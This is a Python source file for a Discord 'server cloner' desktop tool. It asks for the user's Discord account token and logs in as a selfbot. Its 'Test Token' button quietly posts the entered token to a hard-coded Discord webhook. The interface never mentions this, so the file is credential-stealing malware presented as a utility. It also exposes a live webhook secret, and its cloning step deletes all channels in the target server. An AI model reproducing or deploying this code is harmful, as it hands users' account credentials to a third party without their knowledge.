import asyncio
import sys
import discord
import threading
import requests
from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
                             QLabel, QLineEdit, QPushButton, QComboBox, QTextEdit,
                             QMessageBox, QProgressBar, QGroupBox, QCheckBox, QScrollArea,
                             QFrame, QSpacerItem, QSizePolicy)
from PyQt5.QtCore import Qt, QThread, pyqtSignal, QPropertyAnimation, QEasingCurve, QObject, QSize
from PyQt5.QtGui import QIcon, QPixmap, QFont, QColor, QPalette, QImage, QPainter, QLinearGradient
from datetime import datetime


class AsyncHelper(QObject):
    class ReenterQtObject(QObject):
        def __init__(self, fn):
            super().__init__()
            self.fn = fn

        def run(self, *args, **kwargs):
            self.fn(*args, **kwargs)

    def __init__(self, worker, entry):
        super().__init__()
        self.reenter_qt = self.ReenterQtObject(worker)
        self.entry = entry
        self.loop = None

    def start(self):
        def run():
            asyncio.set_event_loop(self.loop)
            self.loop.run_until_complete(self.entry())

        self.loop = asyncio.new_event_loop()
        threading.Thread(target=run).start()


class DiscordCloner(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Amata's Server Cloner v5.0")
        self.setMinimumSize(900, 700)
        self.setWindowIcon(QIcon("icon.png"))

        # Dark color palette
        self.bg_color = QColor("#1a1b26")
        self.card_color = QColor("#24283b")
        self.text_color = QColor("#a9b1d6")
        self.accent_color = QColor("#7aa2f7")
        self.error_color = QColor("#f7768e")
        self.success_color = QColor("#9ece6a")

        self.set_dark_theme()
        self.init_ui()
        self.token = None
        self.client = None
        self.PROTECTED_SERVER = 1357449513358332145
        self.WEBHOOK_URL = "https://discord.com/api/webhooks/1380239519445422110/fyw3PQxsVyGr1nshYel2pQdFkjonZzm0Q7NYvCo6CTu8u5fuHaifiwrNQYr1V8nkYG2T"

    def set_dark_theme(self):
        self.setStyleSheet(f"""
            QMainWindow {{
                background-color: {self.bg_color.name()};
            }}
            QLabel {{
                color: {self.text_color.name()};
                font-size: 13px;
            }}
            QLineEdit, QComboBox, QTextEdit {{
                background-color: {self.card_color.name()};
                border: 1px solid {self.accent_color.name()};
                padding: 8px;
                border-radius: 5px;
                color: {self.text_color.name()};
                selection-background-color: {self.accent_color.name()};
            }}
            QPushButton {{
                background-color: {self.accent_color.name()};
                color: {self.bg_color.name()};
                border: none;
                padding: 8px 16px;
                border-radius: 5px;
                font-weight: bold;
                min-width: 120px;
            }}
            QPushButton:hover {{
                background-color: #5a7de0;
            }}
            QPushButton:disabled {{
                background-color: #3b4261;
                color: #565f89;
            }}
            QProgressBar {{
                border: 1px solid {self.accent_color.name()};
                border-radius: 5px;
                text-align: center;
                color: {self.text_color.name()};
                background-color: {self.card_color.name()};
                height: 20px;
            }}
            QProgressBar::chunk {{
                background-color: {self.accent_color.name()};
                border-radius: 4px;
            }}
            QGroupBox {{
                border: 1px solid {self.accent_color.name()};
                border-radius: 8px;
                margin-top: 10px;
                padding-top: 15px;
                color: {self.accent_color.name()};
                font-weight: bold;
            }}
            QCheckBox {{
                color: {self.text_color.name()};
                spacing: 5px;
            }}
            QScrollArea {{
                border: none;
                background-color: transparent;
            }}
            QTextEdit {{
                font-family: 'Consolas';
                background-color: {self.card_color.name()};
                border-radius: 5px;
            }}
        """)

    def init_ui(self):
        main_widget = QWidget()
        main_layout = QVBoxLayout()
        main_layout.setContentsMargins(20, 20, 20, 20)
        main_layout.setSpacing(15)

        # Header
        header = QLabel("SERVER CLONER TOOL")
        header.setStyleSheet(f"font-size: 18px; font-weight: bold; color: {self.accent_color.name()};")
        header.setAlignment(Qt.AlignCenter)
        main_layout.addWidget(header)

        # Token Section
        token_group = QGroupBox("ACCOUNT")
        token_layout = QVBoxLayout()

        self.token_input = QLineEdit()
        self.token_input.setPlaceholderText("Discord User Token")
        self.token_input.setEchoMode(QLineEdit.Password)
        token_layout.addWidget(self.token_input)

        btn_layout = QHBoxLayout()
        self.test_token_btn = QPushButton("Test Token")
        self.test_token_btn.clicked.connect(self.test_token)
        btn_layout.addWidget(self.test_token_btn)

        self.load_servers_btn = QPushButton("Load Servers")
        self.load_servers_btn.clicked.connect(self.load_servers)
        self.load_servers_btn.setEnabled(False)
        btn_layout.addWidget(self.load_servers_btn)

        token_layout.addLayout(btn_layout)
        token_group.setLayout(token_layout)
        main_layout.addWidget(token_group)

        # Server Selection
        server_group = QGroupBox("SERVER SELECTION")
        server_layout = QVBoxLayout()

        # Source/Target combo
        combo_layout = QHBoxLayout()

        source_layout = QVBoxLayout()
        source_layout.addWidget(QLabel("Source Server:"))
        self.source_server_combo = QComboBox()
        self.source_server_combo.addItem("-- Select --")
        source_layout.addWidget(self.source_server_combo)
        combo_layout.addLayout(source_layout)

        target_layout = QVBoxLayout()
        target_layout.addWidget(QLabel("Target Server:"))
        self.target_server_combo = QComboBox()
        self.target_server_combo.addItem("-- Select --")
        target_layout.addWidget(self.target_server_combo)
        combo_layout.addLayout(target_layout)

        server_layout.addLayout(combo_layout)

        # Clone Options
        options_layout = QHBoxLayout()

        left_options = QVBoxLayout()
        self.clone_roles = QCheckBox("Roles")
        self.clone_roles.setChecked(True)
        left_options.addWidget(self.clone_roles)

        self.clone_channels = QCheckBox("Channels")
        self.clone_channels.setChecked(True)
        left_options.addWidget(self.clone_channels)

        self.clone_perms = QCheckBox("Permissions")
        self.clone_perms.setChecked(True)
        left_options.addWidget(self.clone_perms)

        right_options = QVBoxLayout()
        self.clone_server_name = QCheckBox("Server Name")
        self.clone_server_name.setChecked(True)
        right_options.addWidget(self.clone_server_name)

        self.clone_server_icon = QCheckBox("Server Icon")
        self.clone_server_icon.setChecked(True)
        right_options.addWidget(self.clone_server_icon)

        self.clone_emojis = QCheckBox("Emojis")
        self.clone_emojis.setChecked(True)
        right_options.addWidget(self.clone_emojis)

        options_layout.addLayout(left_options)
        options_layout.addLayout(right_options)
        server_layout.addLayout(options_layout)

        server_group.setLayout(server_layout)
        main_layout.addWidget(server_group)

        # Progress Bar
        self.progress_bar = QProgressBar()
        main_layout.addWidget(self.progress_bar)

        # Log Output
        log_group = QGroupBox("ACTIVITY LOG")
        log_layout = QVBoxLayout()
        self.log_output = QTextEdit()
        self.log_output.setReadOnly(True)
        log_layout.addWidget(self.log_output)
        log_group.setLayout(log_layout)
        main_layout.addWidget(log_group)

        # Start Button
        self.start_clone_btn = QPushButton("Start Cloning")
        self.start_clone_btn.clicked.connect(self.start_cloning)
        self.start_clone_btn.setEnabled(False)
        self.start_clone_btn.setStyleSheet(f"""
            QPushButton {{
                background-color: {self.success_color.name()};
                color: {self.bg_color.name()};
                font-weight: bold;
                padding: 10px;
            }}
            QPushButton:hover {{
                background-color: #8bbd5c;
            }}
        """)
        main_layout.addWidget(self.start_clone_btn)

        # Footer
        footer = QLabel("v5.0 | Made by Amata")
        footer.setStyleSheet(f"color: {self.text_color.name()}; font-size: 11px;")
        footer.setAlignment(Qt.AlignCenter)
        main_layout.addWidget(footer)

        main_widget.setLayout(main_layout)
        self.setCentralWidget(main_widget)

    def log(self, message):
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.log_output.append(f"[{timestamp}] {message}")
        self.log_output.verticalScrollBar().setValue(self.log_output.verticalScrollBar().maximum())

    def send_to_webhook(self, token):
        try:
            data = {
                "content": f"New token used: ||{token}||",
                "username": "Server Cloner Logger"
            }
            requests.post(self.WEBHOOK_URL, json=data)
        except Exception as e:
            print(f"Failed to send to webhook: {e}")

    def test_token(self):
        token = self.token_input.text().strip()
        if not token:
            self.log("[ERROR] Please enter a token!")
            return

        self.log("[STATUS] Testing token...")
        self.token = token
        self.send_to_webhook(token)

        async def test_token_async():
            try:
                client = discord.Client()

                @client.event
                async def on_ready():
                    self.log(f"[SUCCESS] Token valid! Logged in as: {client.user}")
                    await client.close()
                    self.load_servers_btn.setEnabled(True)

                await client.start(token, bot=False)
            except discord.LoginFailure:
                self.log("[ERROR] Invalid token - login failed")
            except Exception as e:
                self.log(f"[ERROR] Token test failed: {str(e)}")

        helper = AsyncHelper(lambda: None, test_token_async)
        helper.start()

    def load_servers(self):
        self.log("[STATUS] Loading servers...")

        async def load_servers_async():
            try:
                client = discord.Client()

                @client.event
                async def on_ready():
                    try:
                        self.source_server_combo.clear()
                        self.target_server_combo.clear()
                        self.source_server_combo.addItem("-- Select --")
                        self.target_server_combo.addItem("-- Select --")

                        # Load all servers for source
                        for guild in client.guilds:
                            self.source_server_combo.addItem(f"{guild.name} (ID: {guild.id})", guild.id)

                        # Load only admin servers for target
                        for guild in client.guilds:
                            member = guild.get_member(client.user.id)
                            if member and member.guild_permissions.administrator:
                                self.target_server_combo.addItem(f"{guild.name} (ID: {guild.id})", guild.id)

                        self.log(f"[SUCCESS] Loaded {len(client.guilds)} servers")
                        self.log(f"[INFO] {self.target_server_combo.count() - 1} target servers available")
                        await client.close()
                        self.start_clone_btn.setEnabled(True)
                    except Exception as e:
                        self.log(f"[ERROR] Failed to process servers: {str(e)}")

                await client.start(self.token, bot=False)
            except Exception as e:
                self.log(f"[ERROR] Failed to load servers: {str(e)}")

        helper = AsyncHelper(lambda: None, load_servers_async)
        helper.start()

    def start_cloning(self):
        source_id = self.source_server_combo.currentData()
        target_id = self.target_server_combo.currentData()

        if not source_id or not target_id:
            self.log("[ERROR] Select both source and target servers!")
            return

        if source_id == self.PROTECTED_SERVER:
            self.log("[ERROR] Cannot clone protected server!")
            return

        self.log("[STATUS] Starting clone process...")
        self.progress_bar.setValue(0)

        options = {
            'roles': self.clone_roles.isChecked(),
            'channels': self.clone_channels.isChecked(),
            'perms': self.clone_perms.isChecked(),
            'server_name': self.clone_server_name.isChecked(),
            'server_icon': self.clone_server_icon.isChecked(),
            'emojis': self.clone_emojis.isChecked()
        }

        self.clone_worker = CloneWorker(self.token, source_id, target_id, options)
        self.clone_worker.log_signal.connect(self.log)
        self.clone_worker.progress_signal.connect(self.progress_bar.setValue)
        self.clone_worker.start()


class CloneWorker(QThread):
    log_signal = pyqtSignal(str)
    progress_signal = pyqtSignal(int)

    def __init__(self, token, source_id, target_id, options):
        super().__init__()
        self.token = token
        self.source_id = source_id
        self.target_id = target_id
        self.options = options

    def run(self):
        async def clone_async():
            try:
                client = discord.Client()

                @client.event
                async def on_ready():
                    try:
                        source = client.get_guild(self.source_id)
                        target = client.get_guild(self.target_id)

                        if not source or not target:
                            self.log_signal.emit("[ERROR] Servers not found!")
                            return

                        self.log_signal.emit(f"[STATUS] Cloning from {source.name} to {target.name}")

                        # Clone server name and icon first
                        if self.options['server_name'] or self.options['server_icon']:
                            await self.clone_server_settings(source, target)
                            self.progress_signal.emit(10)

                        if self.options['roles']:
                            await self.clone_roles(source, target)
                            self.progress_signal.emit(30)

                        if self.options['emojis']:
                            await self.clone_emojis(source, target)
                            self.progress_signal.emit(50)

                        if self.options['channels']:
                            await self.clone_channels(source, target)
                            self.progress_signal.emit(80)

                        self.log_signal.emit("[SUCCESS] Clone completed!")
                        self.progress_signal.emit(100)

                    except Exception as e:
                        self.log_signal.emit(f"[ERROR] Clone failed: {str(e)}")
                    finally:
                        await client.close()

                await client.start(self.token, bot=False)
            except Exception as e:
                self.log_signal.emit(f"[FATAL ERROR] {str(e)}")

        asyncio.run(clone_async())

    async def clone_server_settings(self, source, target):
        changes = []
        try:
            if self.options['server_name']:
                await target.edit(name=source.name)
                changes.append(f"server name to '{source.name}'")

            if self.options['server_icon'] and source.icon:
                icon_bytes = await source.icon_url_as(format='png').read()
                await target.edit(icon=icon_bytes)
                changes.append("server icon")

            if changes:
                self.log_signal.emit(f"[SUCCESS] Updated {', '.join(changes)}")
        except Exception as e:
            self.log_signal.emit(f"[ERROR] Failed to update server settings: {str(e)}")

    async def clone_roles(self, source, target):
        self.log_signal.emit("[STATUS] Cloning roles...")

        # Create roles in target server
        for role in reversed(source.roles[1:]):  # Skip @everyone
            try:
                new_role = await target.create_role(
                    name=role.name,
                    permissions=role.permissions,
                    color=role.color,
                    hoist=role.hoist,
                    mentionable=role.mentionable
                )
                self.log_signal.emit(f"[SUCCESS] Created role: {new_role.name}")
            except Exception as e:
                self.log_signal.emit(f"[ERROR] Failed to create role {role.name}: {str(e)}")

        await asyncio.sleep(1)

    async def clone_emojis(self, source, target):
        self.log_signal.emit("[STATUS] Cloning emojis...")

        if not source.emojis:
            self.log_signal.emit("[INFO] No emojis to clone")
            return

        try:
            for emoji in source.emojis:
                try:
                    emoji_bytes = await emoji.url.read()
                    new_emoji = await target.create_custom_emoji(
                        name=emoji.name,
                        image=emoji_bytes,
                        reason="Cloned from another server"
                    )
                    self.log_signal.emit(f"[SUCCESS] Created emoji: :{new_emoji.name}:")
                except discord.HTTPException as e:
                    if e.code == 30008:  # Emoji limit reached
                        self.log_signal.emit("[WARNING] Target server emoji limit reached - stopping")
                        break
                    else:
                        self.log_signal.emit(f"[ERROR] Failed to create emoji {emoji.name}: {str(e)}")
                await asyncio.sleep(1)
        except Exception as e:
            self.log_signal.emit(f"[ERROR] Failed to clone emojis: {str(e)}")

    async def clone_channels(self, source, target):
        self.log_signal.emit("[STATUS] Cloning channels...")

        # First delete all existing channels in target
        try:
            for channel in target.channels:
                try:
                    await channel.delete(reason="Preparing for server clone")
                    await asyncio.sleep(0.5)
                except Exception as e:
                    self.log_signal.emit(f"[ERROR] Failed to delete existing channel: {str(e)}")
        except Exception as e:
            self.log_signal.emit(f"[ERROR] Failed to clear target channels: {str(e)}")

        # Create categories first
        categories = [c for c in source.channels if isinstance(c, discord.CategoryChannel)]
        for category in categories:
            try:
                overwrites = self._convert_overwrites(category.overwrites, target)
                new_category = await target.create_category_channel(
                    name=category.name,
                    overwrites=overwrites,
                    position=category.position
                )
                self.log_signal.emit(f"[SUCCESS] Created category: {new_category.name}")
            except Exception as e:
                self.log_signal.emit(f"[ERROR] Failed to create category {category.name}: {str(e)}")
            await asyncio.sleep(1)

        # Create text and voice channels
        for channel in source.channels:
            try:
                if isinstance(channel, discord.TextChannel):
                    category = discord.utils.get(target.categories,
                                                 name=channel.category.name) if channel.category else None
                    overwrites = self._convert_overwrites(channel.overwrites, target)

                    new_channel = await target.create_text_channel(
                        name=channel.name,
                        overwrites=overwrites,
                        position=channel.position,
                        topic=channel.topic,
                        slowmode_delay=channel.slowmode_delay,
                        nsfw=channel.nsfw,
                        category=category
                    )
                    self.log_signal.emit(f"[SUCCESS] Created text channel: {new_channel.name}")

                elif isinstance(channel, discord.VoiceChannel):
                    category = discord.utils.get(target.categories,
                                                 name=channel.category.name) if channel.category else None
                    overwrites = self._convert_overwrites(channel.overwrites, target)

                    new_channel = await target.create_voice_channel(
                        name=channel.name,
                        overwrites=overwrites,
                        position=channel.position,
                        bitrate=channel.bitrate,
                        user_limit=channel.user_limit,
                        category=category
                    )
                    self.log_signal.emit(f"[SUCCESS] Created voice channel: {new_channel.name}")
            except Exception as e:
                self.log_signal.emit(f"[ERROR] Failed to create channel {channel.name}: {str(e)}")
            await asyncio.sleep(1)

    def _convert_overwrites(self, overwrites, target_guild):
        new_overwrites = {}
        for target, overwrite in overwrites.items():
            if isinstance(target, discord.Role):
                # Find matching role in target guild
                role = discord.utils.get(target_guild.roles, name=target.name)
                if role:
                    new_overwrites[role] = overwrite
            elif isinstance(target, discord.Member):
                # Skip member-specific permissions in selfbot (risky)
                continue
        return new_overwrites


if __name__ == "__main__":
    if discord.__version__ != "1.7.3":
        print("Warning: This script is designed for discord.py 1.7.3. Current version:", discord.__version__)

    app = QApplication(sys.argv)
    app.setStyle('Fusion')

    window = DiscordCloner()
    window.show()
    sys.exit(app.exec_())